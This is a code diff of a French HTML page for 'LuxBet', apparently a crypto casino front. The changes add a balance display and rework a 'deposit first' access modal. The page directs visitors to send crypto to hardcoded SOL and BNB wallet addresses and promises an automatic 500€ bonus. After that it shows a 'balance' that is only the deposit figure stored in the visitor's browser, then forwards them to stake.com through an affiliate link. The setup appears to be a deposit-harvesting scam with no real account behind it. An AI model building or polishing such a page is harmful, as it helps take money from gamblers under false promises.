@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="LuxBet - Dépôt crypto auto-détecté → Jeux débloqués"/>
+  <meta name="description" content="LuxBet - Dépôt crypto auto-détecté → Jeux débloqués + Solde"/>
   <title>LuxBet | Dépôt Auto → Jeux Débloqués</title>
 
   <!-- Fonts -->
@@ -34,6 +34,13 @@
     }
     .logo { font-family: 'Playfair Display', serif; font-size: 1.9rem; font-weight: 700; color: var(--secondary); text-decoration: none; }
     .logo span { color: var(--primary); }
+
+    /* Solde */
+    .balance {
+      background: var(--success); padding: 0.5rem 1rem; border-radius: 20px; font-weight: 600; font-size: 1rem;
+      display: none;
+    }
+    .balance.show { display: inline-block; }
 
     /* Hamburger */
     .hamburger {
@@ -117,10 +124,10 @@
     .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--success); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 1rem auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    /* Modal Message */
+    /* Modal */
     .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; padding: 1rem; }
     .modal.active { display: flex; }
-    .modal-content { background: var(--card); padding: 2rem; border-radius: 20px; max-width: 600px; width: 100%; max-height: 80vh; overflow-y: auto; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+    .modal-content { background: var(--card); padding: 2rem; border-radius: 20px; max-width: 600px; width: 100%; max-height: 80vh; overflow-y: auto; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
     .modal-content h2 { color: var(--secondary); margin-bottom: 1rem; }
     .modal-content p { margin: 1rem 0; }
     .modal-content ul { margin: 1rem 0; padding-left: 1.5rem; }
@@ -148,18 +155,19 @@
     </div>
     <div class="menu" id="menu">
       <a href="#regulation" onclick="showRegulation()">Réglementation</a>
-      <a href="#casino" onclick="checkDeposit('Casino en ligne')">Casino en ligne</a>
-      <a href="#jeux" onclick="checkDeposit('Jeux Casino')">Jeux Casino</a>
+      <a href="#casino" onclick="checkAccess('Casino en ligne')">Casino en ligne</a>
+      <a href="#jeux" onclick="checkAccess('Jeux Casino')">Jeux Casino</a>
       <a href="#support" onclick="showSupport()">Support</a>
     </div>
     <a href="#" class="logo">Lux<span>Bet</span></a>
+    <span class="balance" id="balance">Solde: 0€</span>
   </header>
 
   <!-- Hero -->
   <section class="hero">
     <div class="hero-content">
       <h1>Dépôt <span class="highlight">Auto-Détecté</span></h1>
-      <p>Envoyez en crypto → Jeux débloqués en 10 secondes</p>
+      <p>Envoyez en crypto → Jeux débloqués + Solde mis à jour</p>
       <div class="bonus">
         <h2>500€ + 200 FS</h2>
         <p>Automatique après réception</p>
@@ -207,12 +215,23 @@
     <!-- Débloqué -->
     <div class="unlocked" id="unlocked" style="display:none;">
       <h2>JEUX DÉBLOQUÉS !</h2>
-      <p>Accès immédiat aux vrais jeux</p>
+      <p>Votre solde est mis à jour</p>
       <a href="https://stake.com/?c=luxbet2025" target="_blank" class="btn btn-large">
         JOUER MAINTENANT
       </a>
     </div>
   </section>
+
+  <!-- Modals -->
+  <!-- Modal Accès Refusé (1 fois par session) -->
+  <div class="modal" id="accessModal">
+    <div class="modal-content">
+      <span class="close-modal" onclick="closeModal('accessModal')">×</span>
+      <h2>Accès Restreint</h2>
+      <p><strong>Fait un dépôt avant de rentrer ici</strong></p>
+      <button class="btn" onclick="goToDeposit()">Faire un dépôt maintenant</button>
+    </div>
+  </div>
 
   <!-- Modal Réglementation -->
   <div class="modal" id="regulationModal">
@@ -228,7 +247,7 @@
     </div>
   </div>
 
-  <!-- Modal Support (Jeu Responsable) -->
+  <!-- Modal Support -->
   <div class="modal" id="supportModal">
     <div class="modal-content">
       <span class="close-modal" onclick="closeModal('supportModal')">×</span>
@@ -256,22 +275,11 @@
     </div>
   </div>
 
-  <!-- Modal Accès Refusé -->
-  <div class="modal" id="accessModal">
-    <div class="modal-content">
-      <span class="close-modal" onclick="closeModal('accessModal')">×</span>
-      <h2>Accès Restreint</h2>
-      <p><strong>Fait un dépôt avant de rentrer ici</strong></p>
-      <button class="btn" onclick="document.getElementById('dashboard').scrollIntoView({behavior:'smooth'}); closeModal('accessModal');">
-        Faire un dépôt maintenant
-      </button>
-    </div>
-  </div>
-
   <!-- QR Code -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
   <script>
+    // ADRESSES EXACTES
     const addresses = {
       sol: 'EGvemaEtYWCxwjGWgPL2Q23P8iUAEh3f9ZixUERBDxEJ',
       bnb: '0x684753E3c806AE18734d8233d673d999Faf3FcFd',
@@ -280,6 +288,7 @@
 
     let currentTx = null;
     let checkInterval = null;
+    let accessShown = false; // UNE SEULE FOIS
 
     // Éléments
     const status = document.getElementById('status');
@@ -287,6 +296,7 @@
     const loader = document.getElementById('loader');
     const checking = document.getElementById('checking');
     const unlocked = document.getElementById('unlocked');
+    const balanceEl = document.getElementById('balance');
     const dashboard = document.getElementById('dashboard');
 
     // Hamburger
@@ -328,7 +338,7 @@
       loader.style.display = 'block';
       checking.style.display = 'block';
 
-      currentTx = { addr, amount, type };
+      currentTx = { addr, amount, type, eur };
       localStorage.setItem('pendingTx', JSON.stringify(currentTx));
 
       startChecking();
@@ -346,7 +356,7 @@
         const received = await checkDeposit(currentTx);
         if (received) {
           clearInterval(checkInterval);
-          unlockGames();
+          unlockGames(currentTx.eur);
         }
       }, 5000);
     }
@@ -385,42 +395,48 @@
       return false;
     }
 
-    function unlockGames() {
+    function unlockGames(eur) {
       loader.style.display = 'none';
       checking.style.display = 'none';
       status.classList.replace('pending', 'success');
-      status.innerHTML = `<strong style="color:var(--success);">DÉPÔT REÇU !</strong><p>Jeux débloqués automatiquement.</p>`;
+      status.innerHTML = `<strong style="color:var(--success);">DÉPÔT REÇU !</strong><p>Solde mis à jour.</p>`;
       unlocked.style.display = 'block';
+      balanceEl.textContent = `Solde: ${eur}€`;
+      balanceEl.classList.add('show');
       localStorage.setItem('depositDone', 'true');
+      localStorage.setItem('balance', eur);
       localStorage.removeItem('pendingTx');
     }
 
-    // Vérification dépôt
-    function checkDeposit(section) {
-      if (localStorage.getItem('depositDone') !== 'true') {
+    // Vérification accès (1 fois)
+    function checkAccess(section) {
+      if (localStorage.getItem('depositDone') !== 'true' && !accessShown) {
         document.getElementById('accessModal').classList.add('active');
-      } else {
+        accessShown = true;
+      } else if (localStorage.getItem('depositDone') === 'true') {
         alert(`Bienvenue dans ${section} !`);
       }
     }
 
+    function goToDeposit() {
+      closeModal('accessModal');
+      dashboard.scrollIntoView({ behavior: 'smooth' });
+    }
+
     // Modals
-    function showRegulation() {
-      closeMenu();
-      document.getElementById('regulationModal').classList.add('active');
-    }
-    function showSupport() {
-      closeMenu();
-      document.getElementById('supportModal').classList.add('active');
-    }
-    function closeModal(id) {
-      document.getElementById(id).classList.remove('active');
-    }
+    function showRegulation() { closeMenu(); document.getElementById('regulationModal').classList.add('active'); }
+    function showSupport() { closeMenu(); document.getElementById('supportModal').classList.add('active'); }
+    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
 
     // Au chargement
     window.onload = () => {
       dashboard.classList.add('active');
-      if (localStorage.getItem('depositDone') === 'true') unlockGames();
+      const savedBalance = localStorage.getItem('balance');
+      if (savedBalance) {
+        balanceEl.textContent = `Solde: ${savedBalance}€`;
+        balanceEl.classList.add('show');
+        if (localStorage.getItem('depositDone') === 'true') unlockGames(savedBalance);
+      }
       const pending = localStorage.getItem('pendingTx');
       if (pending) {
         currentTx = JSON.parse(pending);
